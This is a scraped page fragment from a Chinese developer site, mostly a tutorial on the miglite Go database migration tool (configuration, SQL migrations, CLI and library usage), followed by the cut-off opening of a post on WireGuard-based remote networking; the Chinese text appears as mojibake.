    style B fill:#bbdefb,stroke:#2196f3,color:#0d47a1
    style C fill:#90caf9,stroke:#2196f3,color:#ffffff
    style D fill:#64b5f6,stroke:#2196f3,color:#ffffff
    style E fill:#42a5f5,stroke:#2196f3,color:#ffffff
    style F fill:#2196f3,stroke:#2196f3,color:#ffffff
</code></pre>
<h2 data-id="heading-7">ğŸ’» å®æˆ˜æ¼”ç¤º</h2>
<h3 data-id="heading-8">1ï¸âƒ£ é…ç½®æ•°æ®åº“è¿æ¥</h3>
<p>miglite æä¾›äº†<strong>å¤šç§é…ç½®æ–¹å¼</strong>ï¼Œä»é›¶é…ç½®åˆ°å®Œæ•´é…ç½®æ–‡ä»¶ä»»ä½ é€‰æ‹©ã€‚</p>
<details>
<summary><strong>ğŸ”§ é…ç½®æ–¹å¼ä¸€ï¼šä½¿ç”¨ miglite.yaml æ–‡ä»¶ï¼ˆæ¨èï¼‰</strong></summary>
<p>åˆ›å»ºé¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»º <code>miglite.yaml</code>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">database:</span>
  <span class="hljs-attr">driver:</span> <span class="hljs-string">sqlite</span>  <span class="hljs-comment"># æ”¯æŒ mysql, postgresql, sqlite</span>
  <span class="hljs-attr">dsn:</span> <span class="hljs-string">./miglite.db</span>  <span class="hljs-comment"># æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æˆ–æ–‡ä»¶è·¯å¾„</span>
<span class="hljs-attr">migrations:</span>
  <span class="hljs-attr">path:</span> <span class="hljs-string">./migrations</span>  <span class="hljs-comment"># è¿ç§»æ–‡ä»¶å­˜æ”¾ç›®å½•</span>
</code></pre>
</details>
<details>
<summary><strong>ğŸ”§ é…ç½®æ–¹å¼äºŒï¼šå®Œå…¨ä½¿ç”¨ç¯å¢ƒå˜é‡ï¼ˆé›¶é…ç½®ï¼‰</strong></summary>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è®¾ç½®è¿ç§»æ–‡ä»¶è·¯å¾„</span>
<span class="hljs-built_in">export</span> MIGRATIONS_PATH=<span class="hljs-string">"./migrations"</span>

<span class="hljs-comment"># SQLite ç¤ºä¾‹</span>
<span class="hljs-built_in">export</span> DATABASE_URL=<span class="hljs-string">"sqlite://path/to/your.db"</span>

<span class="hljs-comment"># MySQL ç¤ºä¾‹</span>
<span class="hljs-built_in">export</span> DATABASE_URL=<span class="hljs-string">"mysql://user:passwd@tcp(127.0.0.1:3306)/local_test?charset=utf8mb4&amp;parseTime=True&amp;loc=Local"</span>

<span class="hljs-comment"># PostgreSQL ç¤ºä¾‹</span>
<span class="hljs-built_in">export</span> DATABASE_URL=<span class="hljs-string">"postgres://host=localhost port=5432 user=username password=password dbname=dbname sslmode=disable"</span>
</code></pre>
<blockquote>
<p>âš ï¸ <strong>æ³¨æ„</strong>ï¼šMySQL è¿æ¥ URL å¿…é¡»å¸¦ä¸Š <code>tcp</code> åè®®æ ‡è®°ï¼Œå¦‚ <code>tcp(127.0.0.1:3306)</code>ã€‚</p>
</blockquote>
</details>
<h3 data-id="heading-9">2ï¸âƒ£ åˆ›å»ºè¿ç§»æ–‡ä»¶</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªæ–°çš„è¿ç§»æ–‡ä»¶</span>
miglite create add-users-table
</code></pre>
<p>è¿™å°†åœ¨ <code>./migrations/</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ ¼å¼ä¸º <code>YYYYMMDD-HHMMSS-{migration-name}.sql</code> çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">./migrations/20251105-102325-add-users-table.sql
</code></pre>
<h3 data-id="heading-10">3ï¸âƒ£ ç¼–å†™è¿ç§» SQL</h3>
<p>è¿ç§»æ–‡ä»¶ä½¿ç”¨ç®€å•çš„æ³¨é‡Šæ ‡è®°æ¥åŒºåˆ† <code>UP</code>ï¼ˆåº”ç”¨ï¼‰å’Œ <code>DOWN</code>ï¼ˆå›æ»šï¼‰æ“ä½œï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- Migrate:UP</span>
<span class="hljs-comment">-- åœ¨è¿™é‡Œæ·»åŠ è¿ç§» SQLï¼ˆåˆ›å»ºè¡¨ã€æ·»åŠ å­—æ®µç­‰ï¼‰</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
    id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY AUTO_INCREMENT,
    username <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">UNIQUE</span>,
    created_at <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);

<span class="hljs-comment">-- Migrate:DOWN</span>
<span class="hljs-comment">-- åœ¨è¿™é‡Œæ·»åŠ å›æ»š SQLï¼ˆåˆ é™¤è¡¨ã€ç§»é™¤å­—æ®µç­‰ï¼‰</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> users;
</code></pre>
<details>
<summary><strong>ğŸ“‹ æ›´å¤æ‚çš„è¿ç§»ç¤ºä¾‹ï¼ˆåŒ…å«ç´¢å¼•å’Œåˆå§‹æ•°æ®ï¼‰</strong></summary>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- Migrate:UP</span>
<span class="hljs-comment">-- åˆ›å»ºæ–‡ç« è¡¨</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> posts (
    id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY AUTO_INCREMENT,
    title <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    content TEXT,
    user_id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    created_at <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
    <span class="hljs-keyword">FOREIGN</span> KEY (user_id) <span class="hljs-keyword">REFERENCES</span> users(id) <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DELETE</span> CASCADE
);

<span class="hljs-comment">-- åˆ›å»ºç´¢å¼•</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_posts_user_id <span class="hljs-keyword">ON</span> posts(user_id);
<span class="hljs-keyword">CREATE</span> INDEX idx_posts_created_at <span class="hljs-keyword">ON</span> posts(created_at);

<span class="hljs-comment">-- æ’å…¥åˆå§‹æ•°æ®</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> posts (title, content, user_id) <span class="hljs-keyword">VALUES</span> 
    (<span class="hljs-string">'Welcome to miglite'</span>, <span class="hljs-string">'This is a sample post.'</span>, <span class="hljs-number">1</span>),
    (<span class="hljs-string">'Getting Started'</span>, <span class="hljs-string">'Learn how to use miglite effectively.'</span>, <span class="hljs-number">1</span>);

<span class="hljs-comment">-- Migrate:DOWN</span>
<span class="hljs-comment">-- å›æ»šæ“ä½œï¼ˆæŒ‰ç›¸åé¡ºåºæ‰§è¡Œï¼‰</span>
<span class="hljs-keyword">DROP</span> INDEX IF <span class="hljs-keyword">EXISTS</span> idx_posts_created_at;
<span class="hljs-keyword">DROP</span> INDEX IF <span class="hljs-keyword">EXISTS</span> idx_posts_user_id;
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> posts;
</code></pre>
</details>
<h3 data-id="heading-11">4ï¸âƒ£ æ‰§è¡Œè¿ç§»</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆå§‹åŒ–è¿ç§»è¡¨ï¼ˆé¦–æ¬¡ä½¿ç”¨å¿…é¡»æ‰§è¡Œï¼‰</span>
miglite init

<span class="hljs-comment"># åº”ç”¨æ‰€æœ‰å¾…å¤„ç†çš„è¿ç§»</span>
miglite up

<span class="hljs-comment"># æ— éœ€ç¡®è®¤ï¼Œç«‹å³æ‰§è¡Œæ‰€æœ‰è¿ç§»</span>
miglite up --<span class="hljs-built_in">yes</span>

<span class="hljs-comment"># å›æ»šæœ€è¿‘çš„è¿ç§»</span>
miglite down

<span class="hljs-comment"># å›æ»šå¤šä¸ªè¿ç§»ï¼ˆä¾‹å¦‚å›æ»šæœ€è¿‘3ä¸ªï¼‰</span>
miglite down --number 3

<span class="hljs-comment"># æŸ¥çœ‹è¿ç§»çŠ¶æ€</span>
miglite status
</code></pre>
<h2 data-id="heading-12">ğŸ§© ä½œä¸ºåº“ä½¿ç”¨é›†æˆ</h2>
<p><code>miglite</code> çš„å¼ºå¤§ä¹‹å¤„åœ¨äºå®ƒä¸ä»…å¯ä»¥ä½œä¸º CLI å·¥å…·ä½¿ç”¨ï¼Œè¿˜å¯ä»¥ <strong>æ— ç¼é›†æˆåˆ°ä½ çš„ Go é¡¹ç›®ä¸­</strong>ã€‚</p>
<blockquote>
<p><code>github.com/gookit/miglite</code> ä¸ä¾èµ–ä»»ä½•ä¸‰æ–¹æ•°æ®åº“é©±åŠ¨åŒ…ï¼Œä½¿ç”¨ä½ é¡¹ç›®ä¸­å¼•å…¥çš„æ•°æ®åº“é©±åŠ¨</p>
</blockquote>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"github.com/gookit/miglite"</span>
    _ <span class="hljs-string">"github.com/go-sql-driver/mysql"</span> <span class="hljs-comment">// å¯¼å…¥æ•°æ®åº“é©±åŠ¨</span>
    <span class="hljs-string">"log"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// åˆ›å»º miglite å®ä¾‹ - é…ç½®æ–‡ä»¶å¯ä»¥ä¸å­˜åœ¨ï¼Œä¼šè‡ªåŠ¨è¯»å–ç›¸å…³ENVå˜é‡ä½¿ç”¨</span>
    m := miglite.New(<span class="hljs-string">"miglite.yaml"</span>)
    
    <span class="hljs-comment">// åˆå§‹åŒ–è¿ç§»è¡¨</span>
    <span class="hljs-keyword">if</span> err := m.Init(); err != <span class="hljs-literal">nil</span> {
        log.Fatal(err)
    }

    <span class="hljs-comment">// åº”ç”¨è¿ç§»</span>
    <span class="hljs-keyword">if</span> err := m.Up(); err != <span class="hljs-literal">nil</span> {
        log.Fatal(err)
    }

    <span class="hljs-comment">// æŸ¥çœ‹è¿ç§»çŠ¶æ€</span>
    status, err := m.Status()
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        log.Fatal(err)
    }
    log.Printf(<span class="hljs-string">"Migration status: %+v"</span>, status)
}
</code></pre>
<h3 data-id="heading-13">ğŸ¨ è‡ªå®šä¹‰å‘½ä»¤è¡Œå·¥å…·</h3>
<p>ä½ è¿˜å¯ä»¥åŸºäº miglite åº“æ„å»º <strong>è‡ªå®šä¹‰çš„è¿ç§»å‘½ä»¤è¡Œå·¥å…·</strong> (è¿™æ˜¯é»˜è®¤è‡ªå¸¦çš„åŠŸèƒ½)ï¼ŒåªåŒ…å«ä½ éœ€è¦çš„æ•°æ®åº“é©±åŠ¨ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"github.com/gookit/miglite"</span>
    <span class="hljs-string">"github.com/gookit/miglite/pkg/command"</span>
    _ <span class="hljs-string">"github.com/go-sql-driver/mysql"</span> <span class="hljs-comment">// åªå¯¼å…¥éœ€è¦çš„é©±åŠ¨</span>
    <span class="hljs-comment">// _ "github.com/lib/pq"           // PostgreSQL é©±åŠ¨ï¼ˆå¯é€‰ï¼‰</span>
    <span class="hljs-comment">// _ "modernc.org/sqlite"          // SQLite é©±åŠ¨ï¼ˆå¯é€‰ï¼‰</span>
)

<span class="hljs-keyword">var</span> Version = <span class="hljs-string">"0.1.0"</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// åˆ›å»º CLI åº”ç”¨</span>
    app := command.NewApp(<span class="hljs-string">"my-migrator"</span>, Version, <span class="hljs-string">"Custom migration tool"</span>)
    
    <span class="hljs-comment">// è¿è¡Œåº”ç”¨</span>
    app.Run()
}
</code></pre>
<h2 data-id="heading-14">ğŸ”¥ é«˜çº§ç‰¹æ€§ä¸æŠ€å·§</h2>
<details>
<summary><strong>ğŸ§ª æ”¯æŒçš„æ•°æ®åº“é©±åŠ¨é€‰æ‹©</strong></summary>






























<table><thead><tr><th align="left">æ•°æ®åº“</th><th align="left">æ¨èé©±åŠ¨</th><th align="left">ç‰¹ç‚¹</th></tr></thead><tbody><tr><td align="left"><strong>MySQL</strong></td><td align="left"><code>github.com/go-sql-driver/mysql</code></td><td align="left">çº¯ Go å®ç°ï¼Œå¹¿æ³›ä½¿ç”¨</td></tr><tr><td align="left"><strong>PostgreSQL</strong></td><td align="left"><code>github.com/lib/pq</code> æˆ– <code>github.com/jackc/pgx/v5</code></td><td align="left">pgx æ€§èƒ½æ›´å¥½ï¼Œlib/pq æ›´å…¼å®¹</td></tr><tr><td align="left"><strong>SQLite</strong></td><td align="left"><code>modernc.org/sqlite</code></td><td align="left">CGO-freeï¼Œè·¨å¹³å°å‹å¥½</td></tr><tr><td align="left"><strong>MSSQL</strong></td><td align="left"><code>github.com/microsoft/go-mssqldb</code></td><td align="left">å®˜æ–¹é©±åŠ¨ï¼ŒåŠŸèƒ½å®Œæ•´</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>æç¤º</strong>ï¼šä½œä¸ºåº“ä½¿ç”¨æ—¶ï¼Œä½ éœ€è¦<strong>è‡ªå·±å¯¼å…¥æ‰€éœ€çš„æ•°æ®åº“é©±åŠ¨</strong>ã€‚</p>
</blockquote>
</details>
<details>
<summary><strong>ğŸ”§ ç¯å¢ƒå˜é‡è‡ªåŠ¨åŠ è½½</strong></summary>
<p>miglite ä¼šè‡ªåŠ¨å°è¯•åŠ è½½é¡¹ç›®ç›®å½•ä¸‹çš„ <code>.env</code> æ–‡ä»¶ï¼Œæ”¯æŒä»¥ä¸‹ç¯å¢ƒå˜é‡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ•°æ®åº“è¿æ¥ URL</span>
DATABASE_URL=<span class="hljs-string">"sqlite://./myapp.db"</span>

<span class="hljs-comment"># è¿ç§»æ–‡ä»¶ç›®å½•</span>
MIGRATIONS_PATH=<span class="hljs-string">"./db/migrations"</span>

<span class="hljs-comment"># å…¶ä»–é…ç½®...</span>
</code></pre>
</details>
<details>
<summary><strong>ğŸ“Š è¿ç§»çŠ¶æ€æŸ¥çœ‹</strong></summary>
<p>ä½¿ç”¨ <code>miglite status</code> å‘½ä»¤å¯ä»¥æŸ¥çœ‹è¯¦ç»†çš„è¿ç§»çŠ¶æ€ï¼ŒåŒ…æ‹¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ miglite status

Migration Status:
================
+----------------+---------+---------------------+
| Migration      | Status  | Applied At          |
+----------------+---------+---------------------+
| 20251105-102325 | UP      | 2025-11-05 10:25:30 |
| 20251106-091500 | UP      | 2025-11-06 09:20:15 |
| 20251107-143000 | DOWN    | 2025-11-07 14:35:00 |
+----------------+---------+---------------------+
</code></pre>
</details>
<h2 data-id="heading-15">ğŸŒŸ ä¸ºä»€ä¹ˆé€‰æ‹© migliteï¼Ÿ</h2>
<p>ä¸å…¶ä»–è¿ç§»å·¥å…·ç›¸æ¯”ï¼Œmiglite æä¾›äº†ç‹¬ç‰¹çš„ä»·å€¼ï¼š</p>






















































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">miglite</th><th align="left">golang-migrate</th><th align="left">goose</th><th align="left">dbmate</th></tr></thead><tbody><tr><td align="left"><strong>ä¾èµ–å¤æ‚åº¦</strong></td><td align="left">æç®€</td><td align="left">ä¸­ç­‰</td><td align="left">ä¸­ç­‰</td><td align="left">ç®€å•</td></tr><tr><td align="left"><strong>é…ç½®æ–¹å¼</strong></td><td align="left">é›¶é…ç½®/æ–‡ä»¶é…ç½®</td><td align="left">æ–‡ä»¶é…ç½®</td><td align="left">æ–‡ä»¶é…ç½®</td><td align="left">ç¯å¢ƒå˜é‡</td></tr><tr><td align="left"><strong>è¿ç§»æ–¹å¼</strong></td><td align="left">åŸç”Ÿ SQL</td><td align="left">å¤šç§æ”¯æŒ</td><td align="left">åŸç”Ÿ SQL/Go</td><td align="left">åŸç”Ÿ SQL</td></tr><tr><td align="left"><strong>äº‹åŠ¡æ”¯æŒ</strong></td><td align="left">âœ… æ˜¯</td><td align="left">âœ… æ˜¯</td><td align="left">âœ… æ˜¯</td><td align="left">âœ… æ˜¯</td></tr><tr><td align="left"><strong>å­¦ä¹ æ›²çº¿</strong></td><td align="left">å¹³ç¼“</td><td align="left">é™¡å³­</td><td align="left">å¹³ç¼“</td><td align="left">å¹³ç¼“</td></tr><tr><td align="left"><strong>åº“é›†æˆ</strong></td><td align="left">âœ… ä¼˜ç§€</td><td align="left">âœ… ä¼˜ç§€</td><td align="left">âœ… ä¸€èˆ¬</td><td align="left">âŒ å¦</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šmiglite åœ¨<strong>ä¿æŒåŠŸèƒ½å®Œæ•´çš„åŒæ—¶</strong>ï¼Œå®ç°äº†<strong>æè‡´çš„ç®€æ´æ€§å’Œæ˜“ç”¨æ€§</strong>ï¼Œéå¸¸é€‚åˆè¿½æ±‚å¼€å‘æ•ˆç‡å’Œä»£ç è´¨é‡çš„å›¢é˜Ÿã€‚</p>
</blockquote>
<h2 data-id="heading-16">ğŸ“ ä½¿ç”¨åœºæ™¯</h2>
<ol>
<li><strong>ä¸ªäººé¡¹ç›®</strong>ï¼šå¿«é€Ÿæ­å»ºé¡¹ç›®åŸå‹ï¼Œæ— éœ€å­¦ä¹ å¤æ‚é…ç½®</li>
<li><strong>å›¢é˜Ÿé¡¹ç›®</strong>ï¼šç»Ÿä¸€è¿ç§»è§„èŒƒï¼Œé€šè¿‡åŸç”Ÿ SQL ä¿æŒè¿ç§»é€»è¾‘é€æ˜</li>
<li><strong>CI/CD é›†æˆ</strong>ï¼šé›¶é…ç½®ç‰¹æ€§ä½¿å…¶ææ˜“é›†æˆåˆ°è‡ªåŠ¨åŒ–æµç¨‹ä¸­</li>
</ol>
<h2 data-id="heading-17">ğŸ¤ è´¡çŒ®ä¸åé¦ˆ</h2>
<p>miglite æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæˆ‘ä»¬æ¬¢è¿ä»»ä½•å½¢å¼çš„è´¡çŒ®ï¼š</p>
<ul>
<li>ğŸ› æŠ¥å‘Š Bug</li>
<li>ğŸ’¡ æå‡ºæ–°ç‰¹æ€§å»ºè®®</li>
<li>ğŸ“ æ”¹è¿›æ–‡æ¡£</li>
<li>ğŸ”§ æäº¤ä»£ç ä¿®å¤</li>
</ul>
<p>è¯·è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgookit%2Fmiglite" target="_blank" title="https://github.com/gookit/miglite" ref="nofollow noopener noreferrer">GitHub é¡¹ç›®ä¸»é¡µ</a> è·å–æ›´å¤šä¿¡æ¯æˆ–å‚ä¸è´¡çŒ®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[wireguard + iptables + dnsmasqå®ç°å¼‚åœ°ç»„ç½‘, ç«¯å£è½¬å‘, è‡ªå®šä¹‰åŸŸåè®¿é—®]]></title>    <link>https://juejin.cn/post/7600344784945692718</link>    <guid>https://juejin.cn/post/7600344784945692718</guid>    <pubDate>2026-01-29T06:53:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600344784945692718" data-draft-id="7600414546188697610" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="wireguard + iptables + dnsmasqå®ç°å¼‚åœ°ç»„ç½‘, ç«¯å£è½¬å‘, è‡ªå®šä¹‰åŸŸåè®¿é—®"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-29T06:53:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="kira9924"/> <meta itemprop="url" content="https://juejin.cn/user/274223726860586"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            wireguard + iptables + dnsmasqå®ç°å¼‚åœ°ç»„ç½‘, ç«¯å£è½¬å‘, è‡ªå®šä¹‰åŸŸåè®¿é—®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/274223726860586/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    kira9924
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:53:43.000Z" title="Thu Jan 29 2026 06:53:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ’° å‰è¨€ï¼šä¸ºä»€ä¹ˆé€‰æ‹©è¿™ä¸ªæ–¹æ¡ˆï¼Ÿ</h2>
<p>éšç€è¿œç¨‹åŠå…¬å’Œè·¨åœ°åä½œæˆä¸ºå¸¸æ€ï¼Œæˆ‘ä¸€ç›´åœ¨å¯»æ‰¾ä¸€ä¸ª<strong>ç¨³å®šã€è½»é‡ä¸”å®‰å…¨</strong>çš„å¼‚åœ°ç½‘ç»œäº’è”æ–¹æ¡ˆã€‚ç»è¿‡å¯¹æ¯”å¤šç§æ–¹æ¡ˆåï¼Œæˆ‘é€‰æ‹©äº†Â <strong>WireGuard + iptables + dnsmasq</strong>Â è¿™å¥—ç»„åˆï¼Œå¹¶å·²<strong>ç¨³å®šè¿è¡Œä¸€å¹´</strong>ã€‚</p>
<p>æˆ‘çš„æ ¸å¿ƒéœ€æ±‚åŒ…æ‹¬ï¼š</p>
<ul>
<li>âœ… <strong>å¼‚åœ°ç»„ç½‘</strong>ï¼šå…¬å¸ç”µè„‘ã€å®¶é‡ŒNASã€æ‰‹æœºéšæ—¶äº’é€š</li>
<li>âœ… <strong>ç«¯å£æ˜ å°„</strong>ï¼šæŠŠå†…ç½‘æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ï¼ˆåƒfrpä¸€æ ·ï¼‰</li>
<li>âœ… <strong>å¥½è®°çš„åŸŸå</strong>ï¼šä¸æƒ³å†è®° <code>10.0.8.xx</code> è¿™ç§IP</li>
</ul>
<p>å¸‚é¢ä¸Šæ–¹æ¡ˆå¾ˆå¤šï¼Œä½†è¦ä¹ˆé‡ï¼ˆOpenVPNï¼‰ï¼Œè¦ä¹ˆéº»çƒ¦ï¼ˆfrp+ddnsï¼‰ã€‚<br/>
